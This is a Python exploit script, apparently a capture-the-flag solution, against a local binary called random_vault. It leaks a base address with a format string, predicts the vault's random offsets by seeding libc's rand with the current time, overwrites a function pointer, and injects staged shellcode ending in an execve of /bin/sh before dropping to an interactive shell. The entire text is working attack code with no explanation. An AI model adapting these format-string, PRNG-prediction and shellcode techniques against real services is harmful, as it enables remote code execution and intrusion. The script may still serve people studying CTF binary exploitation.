from ptrlib import *
import ctypes

glibc = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc-2.27.so')
sock = Process("./random_vault")

# leak proc
sock.sendlineafter(": ", "%11$p")
sock.recvuntil("Hello, ")
proc_base = int(sock.recvline(), 16) - 0x1750
logger.info("proc = " + hex(proc_base))

# set seed
sock.sendlineafter("Quit\n", "3")
glibc.srand(glibc.time(0))
offset = [(glibc.rand() & 0xff) * 8 for i in range(7)]

# overwrite function pointer
payload = fsb(
    pos = 24,
    writes = {proc_base + 0x5000: proc_base + 0x5010 + offset[0]},
    written = 0,
    bs = 2,
    null = False,
    bits = 64
)
sock.sendlineafter("Quit\n", "1")
sock.sendlineafter(": ", payload)
sock.recvuntil("Actions:")

# write shellcode
x = offset[1] - offset[0] - 8
sc1 = u64(b"\x48\x89\xd6\xe9" + p32(x if x > 0 else (0xffffffff ^ (-x)) + 1))
sc2 = u64(b"\x31\xd2\xb6\xff\x31\xff\x0f\x05")
sock.sendlineafter("Quit\n", "2")
sock.sendlineafter(": ", str(sc1))
sock.sendlineafter(": ", str(sc2))
for i in range(5):
    sock.sendlineafter(": ", str(0))

# send second shellcode
shellcode = b'\x90' * (offset[1] + 8)
shellcode += b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
sock.recvline()
sock.recvline()
sock.send(shellcode)
    
sock.interactive()
